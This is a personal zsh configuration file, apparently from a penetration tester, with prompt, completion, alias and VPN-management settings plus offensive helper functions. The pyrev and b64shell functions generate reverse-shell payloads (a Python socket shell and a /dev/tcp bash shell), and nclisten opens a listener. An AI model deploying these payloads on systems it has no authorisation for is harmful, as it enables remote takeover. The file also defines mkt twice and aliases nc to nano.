# ZSHRC DE P4NX0S

# Configuración de Powerlevel10k
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi
typeset -g POWERLEVEL9K_INSTANT_PROMPT=quiet

# Configuración básica
export _JAVA_AWT_WM_NONREPARENTING=1
export LC_ALL=en_US.UTF-8

# PATH
export PATH=$PATH:/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:$HOME/.local/bin:.local/bin

# Historial
HISTSIZE=10000
SAVEHIST=10000
HISTFILE=~/.zsh_history
setopt histignorealldups sharehistory

# Uso de keybindings de emacs
bindkey -e

# Autocompletado
autoload -Uz compinit && compinit
zstyle ':completion:*' auto-description 'Especifica: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completando %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Presiona TAB para más, o el carácter a insertar%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' select-prompt %SScrolling active: selección actual en %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# Alias para listado y visualización
alias ll='lsd -lh --group-dirs=first --date "+%d/%m/%Y"'
alias la='lsd -a --group-dirs=first --date "+%d/%m/%Y"'
alias l='lsd --group-dirs=first --date "+%d/%m/%Y"'
alias lla='lsd -lha --group-dirs=first --date "+%d/%m/%Y"'
alias ls='lsd --group-dirs=first --date "+%d/%m/%Y"'
alias lsl='lsd -la --reverse --inode --date "+%d/%m/%Y"'
alias cat='bat --paging=never'
alias catn='bat'
alias catnl='cat'
alias tail='colortail'
alias orphans='[[ -n $(pacman -Qdt) ]] && sudo pacman -Rs $(pacman -Qdtq) && paru -Yc || echo "no orphans to remove"'
alias fastfetch="fastfetch | lolcat"

# Alias Especiales
alias HOME='cd $HOME'


# Alias Utiles
alias show_rules='sudo nft list ruleset'
alias nmapEnum='nmap -sC -sV -oA nmap_enum'
alias msf='msfconsole -q'
alias wireshark='sudo wireshark'
alias myip='curl ifconfig.me'
alias burp='java -jar -Xmx2g /path/to/burpsuite.jar'
alias scan_ports='sudo nmap -sS -O' 
alias active_connections='ss -tuln'
alias check_auth_log='sudo tail -f /var/log/auth.log'
alias IPS='ip -o addr show | grep -v inet6 | awk '"'"'{print $2, $4}'"'"' | cut -d/ -f1 | grep -v '"'"'lo'"'"' | while read interface ip; do printf "\033[0;34m%-10s\033[0m \033[0;32m%s\033[0m\n" "$interface" "$ip"; done'
alias ytb="mpv --ytdl-format='bestvideo+bestaudio/best' --fs"
alias speedtest="speedtest-cli | lolcat"
alias cvpn='check_vpn'
alias kvpn='kill_vpn'

# Definición de colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Función para verificar VPNs activas
check_vpn() {
    echo -e "${BOLD}${BLUE}=== Verificando conexiones VPN activas ===${NC}\n"
    local vpns_encontradas=0

    # Verificar OpenVPN
    if pgrep -x "openvpn" > /dev/null; then
        echo -e "${BOLD}[1]${NC} ${GREEN}OpenVPN está activo${NC}"
        echo -e "    ${CYAN}PID:${NC} $(pgrep -x 'openvpn')"
        vpns_encontradas=1
    fi

    # Verificar WireGuard
    if ip link show | grep -q "wg"; then
        echo -e "${BOLD}[2]${NC} ${GREEN}WireGuard está activo${NC}"
        echo -e "    ${CYAN}Interfaces:${NC} $(ip link show | grep "wg" | cut -d: -f2)"
        vpns_encontradas=1
    fi

    # Verificar Tailscale
    if ip link show | grep -q "tailscale0"; then
        echo -e "${BOLD}[3]${NC} ${GREEN}Tailscale está activo${NC}"
        echo -e "    ${CYAN}Estado:${NC}"
        tailscale status | sed 's/^/    /'
        echo -e "    ${CYAN}IP:${NC} $(ip addr show tailscale0 | grep inet | awk '{print $2}')"
        vpns_encontradas=1
    fi

    # Verificar otras VPNs
    if ip link show | grep -qE "tun|tap"; then
        echo -e "${BOLD}[4]${NC} ${GREEN}Otras interfaces VPN detectadas:${NC}"
        ip link show | grep -E "tun|tap" | sed 's/^/    /'
        vpns_encontradas=1
    fi

    if [ $vpns_encontradas -eq 0 ]; then
        echo -e "${YELLOW}No se encontraron VPNs activas${NC}"
    fi
}

# Función para matar VPNs selectivamente
kill_vpn() {
    clear
    echo -e "${BOLD}${BLUE}=== Gestor de conexiones VPN ===${NC}\n"
    check_vpn

    echo -e "\n${BOLD}${BLUE}Opciones disponibles:${NC}"
    echo -e "${BOLD}[1]${NC} ${CYAN}Matar OpenVPN${NC}"
    echo -e "${BOLD}[2]${NC} ${CYAN}Matar WireGuard${NC}"
    echo -e "${BOLD}[3]${NC} ${CYAN}Matar Tailscale${NC}"
    echo -e "${BOLD}[4]${NC} ${CYAN}Matar otras VPNs${NC}"
    echo -e "${BOLD}[5]${NC} ${RED}Matar TODAS las VPNs${NC}"
    echo -e "${BOLD}[0]${NC} ${YELLOW}Cancelar${NC}"

    echo -n -e "\n${BOLD}¿Qué VPN quieres terminar? (0-5):${NC} "
    read opcion

    case $opcion in
        1)
            if pgrep -x "openvpn" > /dev/null; then
                echo -e "\n${YELLOW}Matando OpenVPN...${NC}"
                sudo killall openvpn && echo -e "${GREEN}✓ OpenVPN terminado${NC}"
            else
                echo -e "\n${RED}OpenVPN no está activo${NC}"
            fi
            ;;
        2)
            if ip link show | grep -q "wg"; then
                echo -e "\n${YELLOW}Desactivando interfaces WireGuard...${NC}"
                for interface in $(ip link show | grep "wg" | cut -d: -f2); do
                    sudo wg-quick down ${interface// /} && echo -e "${GREEN}✓ Interface ${interface} desactivada${NC}"
                done
            else
                echo -e "\n${RED}WireGuard no está activo${NC}"
            fi
            ;;
        3)
            if ip link show | grep -q "tailscale0"; then
                echo -e "\n${YELLOW}Desactivando Tailscale...${NC}"
                sudo systemctl stop tailscaled && echo -e "${GREEN}✓ Tailscale detenido${NC}"
            else
                echo -e "\n${RED}Tailscale no está activo${NC}"
            fi
            ;;
        4)
            if ip link show | grep -qE "tun|tap"; then
                echo -e "\n${YELLOW}Eliminando otras interfaces VPN...${NC}"
                for interface in $(ip link show | grep -E "tun|tap" | cut -d: -f2); do
                    sudo ip link delete ${interface// /} && echo -e "${GREEN}✓ Interface ${interface} eliminada${NC}"
                done
            else
                echo -e "\n${RED}No se encontraron otras interfaces VPN${NC}"
            fi
            ;;
        5)
            echo -e "\n${RED}¡Atención! Matando todas las VPNs...${NC}"
            # OpenVPN
            sudo killall openvpn 2>/dev/null && echo -e "${GREEN}✓ OpenVPN terminado${NC}"

            # WireGuard
            for interface in $(ip link show | grep "wg" | cut -d: -f2); do
                sudo wg-quick down ${interface// /} 2>/dev/null && echo -e "${GREEN}✓ WireGuard ${interface} desactivado${NC}"
            done

            # Tailscale
            sudo systemctl stop tailscaled 2>/dev/null && echo -e "${GREEN}✓ Tailscale detenido${NC}"

            # Otras interfaces
            for interface in $(ip link show | grep -E "tun|tap" | cut -d: -f2); do
                sudo ip link delete ${interface// /} 2>/dev/null && echo -e "${GREEN}✓ Interface ${interface} eliminada${NC}"
            done
            ;;
        0)
            echo -e "\n${YELLOW}Operación cancelada${NC}"
            return
            ;;
        *)
            echo -e "\n${RED}Opción inválida${NC}"
            return
            ;;
    esac

    echo -e "\n${BOLD}${BLUE}Estado final:${NC}"
    check_vpn
}

# Funciones de seguridad
mkt(){
    mkdir {nmap,content,exploits,scripts}
}

extractPorts(){
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
    echo -e "\n[*] Extrayendo información...\n" > extractPorts.tmp
    echo -e "\t[*] Dirección IP: $ip_address"  >> extractPorts.tmp
    echo -e "\t[*] Puertos abiertos: $ports\n"  >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "[*] Puertos copiados al portapapeles\n"  >> extractPorts.tmp
    cat extractPorts.tmp; rm extractPorts.tmp
}

# Función para SSH
sshfix() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: sshfix <ip_or_hostname> [username]"
        return 1
    fi
    local host="$1"
    local user="${2:-$USER}"
    ssh-keygen -f "${HOME}/.ssh/known_hosts" -R "$host"
    ssh -o StrictHostKeyChecking=accept-new "${user}@${host}"
}

pyrev() {
    local ip=${1:-$(ip route get 1 | awk '{print $7;exit}')}
    local port=${2:-4444}
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

webserver() {
    local port=${1:-8000}
    python -m http.server $port
}

searchexploit() {
    searchsploit "$@" | tee >(grep -P "^Exploit" | sed "s/^/\x1b[1;31m/") >(grep -P "^Shellcode" | sed "s/^/\x1b[1;33m/") >(grep -P "^Paper" | sed "s/^/\x1b[1;36m/")
}

genwordlist() {
    local url=$1
    local output=${2:-wordlist.txt}
    cewl -d 2 -m 5 -w $output $url
    echo "Wordlist generada en $output"
}

nikto_scan() {
    local target=$1
    nikto -h $target -output nikto_$target.txt
}

crypto() {
    if [[ $1 == "encrypt" ]]; then
        gpg -c $2
    elif [[ $1 == "decrypt" ]]; then
        gpg -d $2
    else
        echo "Uso: crypto [encrypt|decrypt] archivo"
    fi
}

genpass() {
    local length=${1:-16}
    openssl rand -base64 48 | cut -c1-$length
}

pingsweep() {
    local subnet=$1
    nmap -sn $subnet
}

hex2ascii() {
    echo "$1" | xxd -r -p
}

ascii2hex() {
    echo -n "$1" | od -A n -t x1
}

find_suid() {
    sudo find / -perm -4000 2>/dev/null
}

b64shell() {
    local ip=${1:-$(ip route get 1 | awk '{print $7;exit}')}
    local port=${2:-4444}
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1" | base64
}

nclisten() {
    local port=${1:-4444}
    sudo nc -lvnp $port
}

mkt(){
    mkdir {nmap,content,exploits,scripts}
}

# Carga de plugins
source ~/.powerlevel10k/powerlevel10k.zsh-theme
source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
source /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
source /usr/share/zsh/plugins/zsh-sudo/sudo.plugin.zsh

# Carga la configuración de p10k
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# Set 'man' colors
function man() {
    env \
    LESS_TERMCAP_mb=$'\e[01;31m' \
    LESS_TERMCAP_md=$'\e[01;31m' \
    LESS_TERMCAP_me=$'\e[0m' \
    LESS_TERMCAP_se=$'\e[0m' \
    LESS_TERMCAP_so=$'\e[01;44;33m' \
    LESS_TERMCAP_ue=$'\e[0m' \
    LESS_TERMCAP_us=$'\e[01;32m' \
    man "$@"
}

# Carga de plugins y configuraciones adicionales
[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
(( ! ${+functions[p10k-instant-prompt-finalize]} )) || p10k-instant-prompt-finalize

# Keybindings personalizados
bindkey "^[[H" beginning-of-line
bindkey "^[[F" end-of-line
bindkey "^[[3~" delete-char
bindkey "^[[1;3C" forward-word
bindkey "^[[1;3D" backward-word

# Carga el tema Powerlevel10k
source ~/.powerlevel10k/powerlevel10k.zsh-theme

# Configuraciones adicionales
export EDITOR=nano
export DXVK_ASYNC=1
export DXVK_STATE_CACHE=1

# Alias de nano
alias n='nano'                                  # Uso rápido
alias ns='sudo nano'                           # Nano como sudo
alias nk='TERM=xterm-256color nano'            # Nano compatible con Kitty
alias nr='TERM=xterm nano'                     # Nano para sesiones remotas
alias nc='nano --colors=always'                # Nano con colores forzados

# Mensaje de bienvenida
echo "Bienvenido, P4NX0S!"
export PATH="$PATH:$HOME/.local/bin"
